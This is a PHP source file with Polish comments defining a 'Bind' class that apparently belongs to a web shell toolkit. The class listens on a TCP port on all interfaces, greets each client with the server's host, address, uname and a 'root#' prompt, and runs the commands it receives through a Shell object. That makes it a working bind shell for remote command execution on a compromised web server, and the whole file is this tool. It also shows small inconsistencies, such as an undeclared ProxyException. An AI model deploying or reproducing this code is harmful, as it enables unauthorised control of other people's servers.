<?php

/**
 * Bind - Bind wyjatki
 */
class BindException extends Exception {}

/**
 * class Proxy - Bind
 */
class Bind
{
	/**
	 * Wersja
	 */
	const VERSION = '1.0';

	/**
	 * Obiekt Shell
	 *
	 * @access protected
	 * @var    object
	 */
	protected $oShell;

	/**
	 * Numer portu
	 *
	 * @access protected
	 * @var    integer
	 */
	protected $iPort = 0;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		/**
		 * Rozszerzenie "sockets" jes wymagane
		 */
		if( ! function_exists( 'socket_create' ) )
		{
			throw new ProxyException( 'Brak rozszerzenia "sockets"' );
		}

		$this -> oShell = $oShell;
	}

	/**
	 * Ustawianie portu
	 *
	 * @access public
	 * @param  integer $iValue Numer portu
	 * @return Proxy           Obiekt Proxy
	 */
	public function setPort( $iValue )
	{
		/**
		 * Sprawdzanie poprawnosci portu
		 */
		if( ( $iValue < 0 ) || ( $iValue > 65535 ) )
		{
			throw new ProxyException( sprintf( 'Błędny port "%d"', $iValue ) );
		}

		$this -> iPort = (int) $iValue;

		return $this;
	}

	/**
	 * Uruchamianie bind'a
	 *
	 * @access public
	 * @return void
	 */
	public function get()
	{
		if( $this -> iPort === 0 )
		{
			throw new ProxyException( 'Nie podano portu' );
		}

		/**
		 * Tworzenie socketa
		 */
		if( ! ( $rSock = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp ' ) ) ) )
		{
			throw new ProxyException( 'Nie można utworzyć połączenia' );
		}

		/**
		 * Bindowanie
		 */
		if( ! ( socket_bind( $rSock, '0.0.0.0', $this -> iPort ) ) )
		{
			throw new ProxyException( sprintf( 'Nie można zbindować "0.0.0.0:%d"', $this -> iPort ) );
		}

		if( ! ( socket_listen( $rSock ) ) )
		{
			throw new BindException( sprintf( 'Nie można nasłuchiwać "0.0.0.0:%d"', $this -> iPort ) );
		}

		$bConnected = FALSE;

		/**
		 * bind
		 */
		for(;;)
		{
			/**
			 * Klient
			 */
			if( ! ( $rClient = socket_accept( $rSock ) ) )
			{
				usleep( 10000 );
			}
			else
			{
				/**
				 * Naglowek
				 */
				if( ! $bConnected )
				{
					socket_write( $rClient, sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
					$bConnected = TRUE;
				}

				/**
				 * Komenda
				 */
				for(;;)
				{
					if( ( $sCmd = rtrim( socket_read( $rClient, 1024, PHP_NORMAL_READ ) ) ) )
					{
						if( $sCmd === ':exit' )
						{
							socket_write( $rClient, "\r\nDobranoc ;)" );
							socket_close( $rSock );
							socket_close( $rClient );

							echo 'Zakończono bindowanie';
							exit ;
						}

						socket_write( $rClient, strtr( $this -> oShell -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
						socket_write( $rClient, "\r\nroot#" );
					}
				}
			}
		}
	}

}